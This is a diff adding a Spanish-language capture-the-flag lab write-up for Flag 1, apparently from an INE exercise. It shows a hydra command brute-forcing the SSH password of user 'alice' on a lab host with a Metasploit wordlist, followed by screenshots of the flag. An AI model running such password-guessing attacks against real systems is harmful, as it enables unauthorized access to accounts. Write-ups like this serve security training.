@@ -2,7 +2,17 @@
 
 ## Flag 1: An insecure ssh user named alice lurks in the system.
 
+Como ya conocemos un usuario y sabemos que el servicio ssh se encuentra activo, pasamos directamente a tratar de obtener sus credenciales.
 
+```console
+root@ine# hydra -l alice -P /usr/share/wordlists/metasploit/unix_passwords.txt target.ine.local ssh
+```
+
+![hydra](img/hydra.png)
+
+Conseguimos acceso al sistema Windows y conseguimos la primera flag en el home del usuario.
+
+![flag1](img/flag1.png)
 
 ## Flag 2: Using the hashdump file discovered in the previous challenge, can you crack the hashes and compromise a user?
 
